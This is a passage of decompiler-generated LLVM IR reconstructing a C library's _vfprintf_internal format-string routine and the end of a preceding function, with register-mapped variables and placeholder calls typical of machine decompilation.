  br label %dec_label_pc_12eb4

dec_label_pc_12eb4:                               ; preds = %bb, %.thread, %dec_label_pc_12eb0
  %v5_12ec0 = phi i32 [ %v0_12eb0, %dec_label_pc_12eb0 ], [ %arg3, %bb ], [ %v3_12e78, %.thread ]
  %tmp17 = icmp slt i32 %v5_12ec0, 1
  br i1 %tmp17, label %.thread8, label %bb18

.thread8:                                         ; preds = %dec_label_pc_12eb4
  br label %bb19

bb18:                                             ; preds = %dec_label_pc_12eb4
  %v5_12ebc = load i32, i32* @r7, align 4
  br label %bb19

bb19:                                             ; preds = %.thread8, %bb18
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_12ebc, %bb18 ]
  %tmp20 = phi i1 [ false, %.thread8 ], [ true, %bb18 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp20, i32 ptrtoint (i32* @global_var_164d4.1042 to i32))
  %v0_12ecc = load i32, i32* %r6.global-to-local, align 4
  %v2_12ecc = add i32 %storemerge, %v0_12ecc
  store i32 %v2_12ecc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12ed0

dec_label_pc_12ed0:                               ; preds = %dec_label_pc_12e94, %bb19
  %v0_12ed0 = phi i32 [ %v4_12ea0, %dec_label_pc_12e94 ], [ %v2_12ecc, %bb19 ]
  store i32 %v0_12ed0, i32* %r0.global-to-local, align 4
  %v2_12ed4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12ed4, i32* %r4.global-to-local, align 4
  store i32 %v9_12e54, i32* %r6.global-to-local, align 4
  ret i32 %v0_12ed0

; uselistorder directives
  uselistorder i32 %v0_12ed0, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_12ed0, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_12eb4, { 2, 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_1()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_1()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_12ed8 = load i32, i32* @r4, align 4
  store i32 %v3_12ed8, i32* %stack_var_-36, align 4
  %v6_12ed8 = load i32, i32* @r5, align 4
  %v15_12ed8 = load i32, i32* @r8, align 4
  %v18_12ed8 = load i32, i32* @sb, align 4
  %v21_12ed8 = load i32, i32* @sl, align 4
  %v24_12ed8 = load i32, i32* @fp, align 4
  %v2_12ee0 = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_12ee0, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_12ee0, i32* %r0.global-to-local, align 4
  %v0_12eec = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_12eec, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_12ef4 = call i32 @_ppfs_init(i32* nonnull %stack_var_-332)
  store i32 %v2_12ef4, i32* %r0.global-to-local, align 4
  %v1_12ef8 = icmp slt i32 %v2_12ef4, 0
  br i1 %v1_12ef8, label %dec_label_pc_12f00, label %dec_label_pc_12f34

dec_label_pc_12f00:                               ; preds = %entry
  %v3_12f00 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_12f00, i32* @r4, align 4
  %v1_12f04 = inttoptr i32 %v3_12f00 to i8*
  store i32 %v3_12f00, i32* %r0.global-to-local, align 4
  %v3_12f08 = call i32 @strlen(i8* %v1_12f04)
  store i32 %v3_12f08, i32* %r0.global-to-local, align 4
  %v2_12f0c = icmp eq i32 %v3_12f08, 0
  br i1 %v2_12f0c, label %bb, label %dec_label_pc_12f1c

bb:                                               ; preds = %dec_label_pc_12f00
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_134ac

dec_label_pc_12f1c:                               ; preds = %dec_label_pc_12f00
  %v0_12f1c = load i32, i32* @r4, align 4
  store i32 %v0_12f1c, i32* %r0.global-to-local, align 4
  %v0_12f20 = load i32, i32* @fp, align 4
  store i32 %v0_12f20, i32* %r2.global-to-local, align 4
  %v3_12f24 = call i32 @__stdio_fwrite(i32 %v0_12f1c, i32 %v3_12f08, i32 %v0_12f20)
  store i32 %v3_12f24, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_134ac

dec_label_pc_12f34:                               ; preds = %entry
  store i32 %v2_12ee0, i32* %r0.global-to-local, align 4
  %v0_12f38 = load i32, i32* @r5, align 4
  %v2_12f3c = call i32 @_ppfs_prepargs(i32 %v2_12ee0, i32 %v0_12f38)
  store i32 %v2_12f3c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v4_12fdc = zext i8 %tmp104 to i32
  %v2_12fe4 = ptrtoint i32* %stack_var_-252 to i32
  %v2_13004 = ptrtoint i32* %stack_var_-36 to i32
  %v2_1301c = icmp eq i32 %tmp102, 0
  %v1_13030 = inttoptr i32 %tmp101 to i32*
  %v2_13320 = ptrtoint i32* %stack_var_-180 to i32
  %v2_1323c = ptrtoint i32* %stack_var_-44 to i32
  %v2_13250 = ptrtoint i32* %stack_var_-52 to i32
  %v3_131ec = add i32 %tmp101, 4
  %v4_131ec = inttoptr i32 %v3_131ec to i32*
  %v2_131f0 = ptrtoint i32* %stack_var_-328 to i32
  %v7_130b0 = zext i8 %tmp99 to i32
  %v2_130ec = ptrtoint i32* %stack_var_-53 to i32
  %v5_130f4 = bitcast i32* %stack_var_-53 to i8*
  %v2_130fc = icmp ugt i32 %tmp102, 4
  %v7_130fc = icmp eq i32 %tmp102, 5
  %v0_13494.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_13014187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_13210 = icmp ugt i32 %tmp102, 16
  %v7_13210 = icmp eq i32 %tmp102, 17
  %v2_13214 = xor i1 %v7_13210, true
  %v3_13214 = and i1 %v2_13210, %v2_13214
  %v2_132b0 = icmp ugt i32 %tmp102, 18
  %v7_132b0 = icmp eq i32 %tmp102, 19
  %v2_132b4 = xor i1 %v7_132b0, true
  %v3_132b4 = and i1 %v2_132b0, %v2_132b4
  %v7_13314 = icmp eq i32 %tmp102, 20
  %v2_13054 = add i32 %tmp102, ptrtoint (i32* @global_var_1fedc.1044 to i32)
  %v1_13058 = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_1fedc.1044 to i32), i32 -1)
  %v2_13058 = inttoptr i32 %v1_13058 to i8*
  %v2_13084 = xor i1 %v7_130fc, true
  %v3_13084 = and i1 %v2_130fc, %v2_13084
  %v7_130b8 = icmp eq i32 %tmp102, 1
  %v2_13104 = xor i1 %v2_130fc, true
  %v3_13104 = or i1 %v7_130fc, %v2_13104
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_1316c = icmp eq i32 %tmp102, 3
  %v11_13178 = icmp eq i32 %tmp102, 4
  %v9_12fe8 = mul nuw nsw i32 %v4_12fdc, 8
  %v10_12fe8 = add nsw i32 %v9_12fe8, -8
  %v6_12ff0 = add i32 %v10_12fe8, %v2_12fe4
  br label %dec_label_pc_13494

bb126:                                            ; preds = %dec_label_pc_12f4c.outer, %.thread7
  %v2_12f4c185 = phi i8 [ %v2_12f4c, %.thread7 ], [ %v2_12f4c181, %dec_label_pc_12f4c.outer ]
  %v1_12f60184 = phi i32 [ %v2_12f60, %.thread7 ], [ %v0_12f4c49, %dec_label_pc_12f4c.outer ]
  %v8_12f54 = icmp eq i8 %v2_12f4c185, 37
  br i1 %v8_12f54, label %dec_label_pc_12f68, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_12f60 = add i32 %v1_12f60184, 1
  store i32 %v2_12f60, i32* @r4, align 4
  %v1_12f4c = inttoptr i32 %v2_12f60 to i8*
  %v2_12f4c = load i8, i8* %v1_12f4c, align 1
  %v3_12f4c = zext i8 %v2_12f4c to i32
  store i32 %v3_12f4c, i32* %r3.global-to-local, align 4
  %v2_12f50 = icmp eq i8 %v2_12f4c, 0
  br i1 %v2_12f50, label %dec_label_pc_12f68, label %bb126

dec_label_pc_12f68:                               ; preds = %bb126, %.thread7, %dec_label_pc_12f4c.outer
  %v1_12f60.lcssa = phi i32 [ %v0_12f4c49, %dec_label_pc_12f4c.outer ], [ %v2_12f60, %.thread7 ], [ %v1_12f60184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_12f68 = sub i32 %v1_12f60.lcssa, %v5_12f78
  %v9_12f68 = icmp eq i32 %v1_12f60.lcssa, %v5_12f78
  br i1 %v9_12f68, label %dec_label_pc_12f9c, label %dec_label_pc_12f70

dec_label_pc_12f70:                               ; preds = %dec_label_pc_12f68
  store i32 %v2_12f68, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_12f68, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_12f70
  store i32 %v5_12f78, i32* %r0.global-to-local, align 4
  %v5_12f80 = load i32, i32* @fp, align 4
  store i32 %v5_12f80, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_12f70, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_12f70 ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_164d4.1042 to i32))
  %v0_12f88 = load i32, i32* %r0.global-to-local, align 4
  %v1_12f88 = load i32, i32* @r5, align 4
  %v9_12f88 = icmp eq i32 %v0_12f88, %v1_12f88
  br i1 %v9_12f88, label %dec_label_pc_12f90, label %dec_label_pc_134a4

dec_label_pc_12f90:                               ; preds = %bb130
  %v2_12f94 = add i32 %v0_12f88, %stack_var_-336.1.ph
  %v0_12f9c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12f9c

dec_label_pc_12f9c:                               ; preds = %dec_label_pc_12f68, %dec_label_pc_12f90
  %v0_12fb0 = phi i32 [ %v5_12f78, %dec_label_pc_12f68 ], [ %v0_12f9c.pre, %dec_label_pc_12f90 ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_12f68 ], [ %v2_12f94, %dec_label_pc_12f90 ]
  %v1_12f9c = inttoptr i32 %v0_12fb0 to i8*
  %v2_12f9c = load i8, i8* %v1_12f9c, align 1
  %v3_12f9c = zext i8 %v2_12f9c to i32
  store i32 %v3_12f9c, i32* %r3.global-to-local, align 4
  %v2_12fa0 = icmp eq i8 %v2_12f9c, 0
  br i1 %v2_12fa0, label %dec_label_pc_134ac, label %dec_label_pc_12fa8

dec_label_pc_12fa8:                               ; preds = %dec_label_pc_12f9c
  %v1_12fa8 = add i32 %v0_12fb0, 1
  %v2_12fa8 = inttoptr i32 %v1_12fa8 to i8*
  %v3_12fa8 = load i8, i8* %v2_12fa8, align 1
  %v4_12fa8 = zext i8 %v3_12fa8 to i32
  store i32 %v4_12fa8, i32* %r3.global-to-local, align 4
  %v7_12fac = icmp eq i8 %v3_12fa8, 37
  store i32 %v1_12fa8, i32* %r2.global-to-local, align 4
  br i1 %v7_12fac, label %dec_label_pc_1349c, label %dec_label_pc_12fb8

dec_label_pc_12fb8:                               ; preds = %dec_label_pc_12fa8
  store i32 %v2_12ee0, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_12ee0, i32* %r0.global-to-local, align 4
  store i32 %v1_12fa8, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_12fcc = call i32 @_ppfs_parsespec(i32* nonnull %stack_var_-332)
  store i32 %v2_12ee0, i32* @r0, align 4
  %v0_12fd4 = call i32 @_ppfs_setargs()
  store i32 %v0_12fd4, i32* %r0.global-to-local, align 4
  store i32 %v4_12fdc, i32* %ip.global-to-local, align 4
  store i32 %v2_12fe4, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_12fb8
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_12fb8
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_12ff0, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_12ffc78 = phi i32 [ %v6_12ff0, %bb133 ], [ %v2_12fe4, %.thread ]
  store i32 %v2_13004, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_13014187, label %dec_label_pc_12ffc, label %dec_label_pc_13018

dec_label_pc_12ffc:                               ; preds = %bb134, %dec_label_pc_12ffc
  %v5_1300c189 = phi i32 [ %v5_1300c, %dec_label_pc_12ffc ], [ %v2_13004, %bb134 ]
  %v0_12ffc188 = phi i32 [ %v1_13000, %dec_label_pc_12ffc ], [ %v0_12ffc78, %bb134 ]
  %v2_12ffc = add i32 %v5_1300c189, -4
  %v3_12ffc = inttoptr i32 %v2_12ffc to i32*
  store i32 %v0_12ffc188, i32* %v3_12ffc, align 4
  %v0_13000 = load i32, i32* %r3.global-to-local, align 4
  %v1_13000 = add i32 %v0_13000, 8
  store i32 %v1_13000, i32* %r3.global-to-local, align 4
  %v0_13008.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13008.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_13004, i32* @lr, align 4
  %v4_1300c = mul i32 %v0_13008.pre, 4
  %v5_1300c = add i32 %v4_1300c, %v2_13004
  %v1_13010 = add i32 %v0_13008.pre, 1
  store i32 %v1_13010, i32* %r2.global-to-local, align 4
  %v5_13014 = icmp slt i32 %v0_13008.pre, %v1_13008.pre
  br i1 %v5_13014, label %dec_label_pc_12ffc, label %dec_label_pc_13018

dec_label_pc_13018:                               ; preds = %dec_label_pc_12ffc, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_1301c, label %dec_label_pc_13024, label %dec_label_pc_13048

dec_label_pc_13024:                               ; preds = %dec_label_pc_13018
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* %ip.global-to-local, align 4
  %v2_13030 = load i32, i32* %v1_13030, align 4
  store i32 %v2_13030, i32* %r0.global-to-local, align 4
  %v1_13034 = and i32 %v0_13078, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_1303c = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_1303c, i32* %r3.global-to-local, align 4
  %v4_13040 = inttoptr i32 %v2_13030 to i8*
  %v5_13040 = call i32 @_store_inttype(i8* %v4_13040, i32 %v1_13034, i32 %stack_var_-336.2, i32 %v3_1303c)
  store i32 %v5_13040, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13490

dec_label_pc_13048:                               ; preds = %dec_label_pc_13018
  br i1 %tmp195, label %dec_label_pc_131d4, label %dec_label_pc_13050

dec_label_pc_13050:                               ; preds = %dec_label_pc_13048
  store i32 %v2_13054, i32* %r3.global-to-local, align 4
  %v3_13058 = load i8, i8* %v2_13058, align 1
  %v4_13058 = zext i8 %v3_13058 to i32
  store i32 %v4_13058, i32* @r4, align 4
  %v7_1305c = icmp eq i8 %v3_13058, 10
  br i1 %v7_1305c, label %dec_label_pc_13068, label %bb135

bb135:                                            ; preds = %dec_label_pc_13050
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_13068:                               ; preds = %dec_label_pc_13050
  store i32 %v0_13078, i32* %r3.global-to-local, align 4
  %v1_1306c = and i32 %v0_13078, 32
  %v2_1306c = icmp eq i32 %v1_1306c, 0
  %.175 = select i1 %v2_1306c, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_13078 = and i32 %v0_13078, 64
  %v2_13078 = icmp eq i32 %v1_13078, 0
  br i1 %v2_13078, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_13068
  %.176 = select i1 %v2_1306c, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_13068, %bb138
  br i1 %v3_13084, label %.thread84, label %dec_label_pc_1308c

.thread84:                                        ; preds = %bb139
  %v5_13084 = sub nsw i32 0, %v4_13058
  store i32 %v5_13084, i32* @r4, align 4
  br label %dec_label_pc_130a4

dec_label_pc_1308c:                               ; preds = %bb139
  br i1 %v7_1316c, label %bb140, label %dec_label_pc_13098

bb140:                                            ; preds = %dec_label_pc_1308c
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_130a4

dec_label_pc_13098:                               ; preds = %dec_label_pc_1308c
  br i1 %v7_130b8, label %dec_label_pc_130a8, label %dec_label_pc_130a4

dec_label_pc_130a4:                               ; preds = %.thread84, %bb140, %dec_label_pc_13098
  %v0_130d086 = phi i32 [ %v5_13084, %.thread84 ], [ %v4_13058, %bb140 ], [ %v4_13058, %dec_label_pc_13098 ]
  br label %dec_label_pc_130a8

dec_label_pc_130a8:                               ; preds = %dec_label_pc_13098, %dec_label_pc_130a4
  %v0_130d085 = phi i32 [ %v0_130d086, %dec_label_pc_130a4 ], [ %v4_13058, %dec_label_pc_13098 ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_130a4 ], [ 6, %dec_label_pc_13098 ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_130a8 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_130a8, i32* %r3.global-to-local, align 4
  %v1_130ac = icmp slt i32 %v3_130a8, 0
  %v7_130b0. = select i1 %v1_130ac, i32 %v7_130b0, i32 32
  store i32 %v7_130b0., i32* @sb, align 4
  br i1 %v7_130b8, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_130a8
  store i32 %v2_13004, i32* @lr, align 4
  %v2_130c0 = load i32, i32* %ip.global-to-local, align 4
  %v5_130c0 = mul i32 %v2_130c0, 4
  %v6_130c0 = add i32 %v5_130c0, %v2_13004
  store i32 %v6_130c0, i32* %r3.global-to-local, align 4
  %v2_130c4 = add i32 %v6_130c0, -260
  %v3_130c4 = inttoptr i32 %v2_130c4 to i32*
  %v4_130c4 = load i32, i32* %v3_130c4, align 4
  store i32 %v4_130c4, i32* %r3.global-to-local, align 4
  %v2_130cc = and i32 %v4_130c4, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_130a8, %.thread16
  %storemerge94 = phi i32 [ %v2_130cc, %.thread16 ], [ 1024, %dec_label_pc_130a8 ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_130d085, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_130d8 = call i32 @_load_inttype()
  %v0_130dc = load i32, i32* @r1, align 4
  store i32 %v0_130dc, i32* %r2.global-to-local, align 4
  %v0_130e8 = load i32, i32* @r4, align 4
  store i32 %v0_130e8, i32* %r3.global-to-local, align 4
  store i32 %v2_130ec, i32* %r0.global-to-local, align 4
  %v0_130f0 = load i32, i32* @r5, align 4
  %v6_130f4 = call i32 @_uintmaxtostr(i8* %v5_130f4, i32 %v0_130d8, i32 %v0_130dc, i32 %v0_130e8, i32 %v0_130f0)
  store i32 %v6_130f4, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_130f4, i32* @r6, align 4
  br i1 %v3_13104, label %bb148, label %dec_label_pc_13108

dec_label_pc_13108:                               ; preds = %bb145
  %v7_130f4 = inttoptr i32 %v6_130f4 to i8*
  %v3_13108 = load i8, i8* %v7_130f4, align 1
  %v7_1310c = icmp eq i8 %v3_13108, 45
  %v2_13114 = or i32 %v0_13078, 2
  %v2_13114.stack_var_-316.4 = select i1 %v7_1310c, i32 %v2_13114, i32 %v0_13078
  store i32 %v2_13114.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_1310c, label %.thread18, label %dec_label_pc_13128

.thread18:                                        ; preds = %dec_label_pc_13108
  %v3_13118 = add i32 %v6_130f4, 1
  store i32 %v3_13118, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_13128:                               ; preds = %dec_label_pc_13108
  %v1_13128 = and i32 %v2_13114.stack_var_-316.4, 2
  %v2_13128 = icmp eq i32 %v1_13128, 0
  br i1 %v2_13128, label %dec_label_pc_13134, label %bb146

bb146:                                            ; preds = %dec_label_pc_13128
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_13134:                               ; preds = %dec_label_pc_13128
  %v1_13134 = urem i32 %v2_13114.stack_var_-316.4, 2
  %v2_13134 = icmp eq i32 %v1_13134, 0
  br i1 %v2_13134, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_13134
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_13134, %bb147
  %v0_13190 = phi i32 [ %v6_130f4, %bb145 ], [ %v3_13118, %.thread18 ], [ %v6_130f4, %dec_label_pc_13134 ], [ %v6_130f4, %bb147 ], [ %v6_130f4, %bb146 ]
  %v0_1314c = phi i32 [ %v0_13078, %bb145 ], [ %v2_13114, %.thread18 ], [ %v0_13078, %dec_label_pc_13134 ], [ %v0_13078, %bb147 ], [ %v0_13078, %bb146 ]
  %v3_1313c = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_1313c, i32* %r2.global-to-local, align 4
  store i32 %v0_1314c, i32* %r3.global-to-local, align 4
  %v1_13144 = icmp slt i32 %v3_1313c, 0
  br i1 %v1_13144, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_13174 = phi i32 [ %v3_1313c, %bb148 ], [ 1, %bb149 ]
  %v1_1314c = and i32 %v0_1314c, 16
  %v2_1314c = icmp eq i32 %v1_1314c, 0
  store i32 %v2_13320, i32* %r3.global-to-local, align 4
  %v2_13154 = sub i32 %v2_13320, %v0_13190
  %v1_13158 = add i32 %v2_13154, 127
  store i32 %v1_13158, i32* @r5, align 4
  br i1 %v2_1314c, label %bb157, label %dec_label_pc_13160

dec_label_pc_13160:                               ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_13160
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_13160, %bb151
  br i1 %v7_1316c, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_13174, %v1_13158
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_13178, label %dec_label_pc_13180, label %bb157

dec_label_pc_13180:                               ; preds = %bb155
  %v1_13180 = inttoptr i32 %v0_13190 to i8*
  %v2_13180 = load i8, i8* %v1_13180, align 1
  %v3_13180 = zext i8 %v2_13180 to i32
  store i32 %v3_13180, i32* %r3.global-to-local, align 4
  %v7_13184 = icmp eq i8 %v2_13180, 48
  br i1 %v7_13184, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_13180
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_13180
  %v2_1318c = add i32 %v2_13154, 128
  store i32 %v2_1318c, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_131c8 = phi i32 [ %v0_13174, %bb155 ], [ %v0_13174, %bb150 ], [ 1, %bb156 ], [ %v2_1318c, %.thread25 ], [ %v0_13174, %bb154 ]
  %v1_13190 = inttoptr i32 %v0_13190 to i8*
  %v2_13190 = load i8, i8* %v1_13190, align 1
  %v3_13190 = zext i8 %v2_13190 to i32
  store i32 %v3_13190, i32* %r3.global-to-local, align 4
  %v7_13194 = icmp eq i8 %v2_13190, 48
  br i1 %v7_13194, label %dec_label_pc_1319c, label %dec_label_pc_131c4

dec_label_pc_1319c:                               ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_131a0 = load i32, i32* @r7, align 4
  %v7_131a4 = icmp slt i32 %v0_131a0, 6
  br i1 %v7_131a4, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_1319c
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_1319c, %bb158
  br i1 %v7_130b8, label %.thread26, label %dec_label_pc_131b8

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_1fec0.1046 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_13338

dec_label_pc_131b8:                               ; preds = %bb159
  %v2_131b8 = icmp eq i32 %v5_131c8, 0
  br i1 %v2_131b8, label %bb160, label %dec_label_pc_131c4

bb160:                                            ; preds = %dec_label_pc_131b8
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_13338

dec_label_pc_131c4:                               ; preds = %dec_label_pc_131b8, %bb157
  %v2_131c4 = sub i32 %v5_131c8, %v1_13158
  %tmp199 = icmp ugt i32 %v5_131c8, %v1_13158
  br i1 %tmp199, label %.thread90, label %dec_label_pc_13338

.thread90:                                        ; preds = %dec_label_pc_131c4
  store i32 %v2_131c4, i32* @r4, align 4
  br label %dec_label_pc_13354thread-pre-split

dec_label_pc_131d4:                               ; preds = %dec_label_pc_13048
  br i1 %tmp196, label %dec_label_pc_13210, label %dec_label_pc_131dc

dec_label_pc_131dc:                               ; preds = %dec_label_pc_131d4
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_131e8 = load i32, i32* @fp, align 4
  store i32 %v0_131e8, i32* %r0.global-to-local, align 4
  %v2_131ec = load i32, i32* %v1_13030, align 4
  %v5_131ec = load i32, i32* %v4_131ec, align 4
  store i32 %v5_131ec, i32* %r2.global-to-local, align 4
  store i32 %v2_131f0, i32* %r3.global-to-local, align 4
  %v5_131f4 = sext i32 %v2_131ec to i64
  %v6_131f4 = bitcast i64 %v5_131f4 to double
  %v7_131f4 = call i32 @_fpmaxtostr(i32 %v0_131e8, double %v6_131f4, i32 %v5_131ec, i32 %v2_131f0, i32 77396)
  store i32 %v7_131f4, i32* %r0.global-to-local, align 4
  %v1_131f8 = icmp slt i32 %v7_131f4, 0
  br i1 %v1_131f8, label %dec_label_pc_134a4, label %dec_label_pc_13200

dec_label_pc_13200:                               ; preds = %dec_label_pc_131dc
  %v2_13204 = add i32 %v7_131f4, %stack_var_-336.2
  store i32 %v2_13204, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13490

dec_label_pc_13210:                               ; preds = %dec_label_pc_131d4
  br i1 %v3_13214, label %dec_label_pc_132b0, label %dec_label_pc_13218

dec_label_pc_13218:                               ; preds = %dec_label_pc_13210
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_13210, label %dec_label_pc_13228, label %dec_label_pc_13278

dec_label_pc_13228:                               ; preds = %dec_label_pc_13218
  %v2_13228 = load i32, i32* %v1_13030, align 4
  store i32 %v2_13228, i32* %r3.global-to-local, align 4
  %v9_1322c = icmp eq i32 %v2_13228, 0
  store i32 %v2_13228, i32* %stack_var_-44, align 4
  br i1 %v9_1322c, label %dec_label_pc_13340, label %dec_label_pc_13238

dec_label_pc_13238:                               ; preds = %dec_label_pc_13228
  %v3_13238 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_13238, i32* %r3.global-to-local, align 4
  store i32 %v2_1323c, i32* @r0, align 4
  %v5_13248 = icmp slt i32 %v3_13238, -1
  br i1 %v5_13248, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_13238
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_13238, %bb161
  %storemerge193 = phi i32 [ %v3_13238, %bb161 ], [ -1, %dec_label_pc_13238 ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_1323c, i32* @r1, align 4
  store i32 %v2_13250, i32* %r3.global-to-local, align 4
  %v0_13254 = call i32 @__GI_wcsrtombs()
  store i32 %v0_13254, i32* %r0.global-to-local, align 4
  %v7_13258 = icmp eq i32 %v0_13254, -1
  store i32 %v0_13254, i32* @r5, align 4
  br i1 %v7_13258, label %dec_label_pc_134a4, label %dec_label_pc_13264

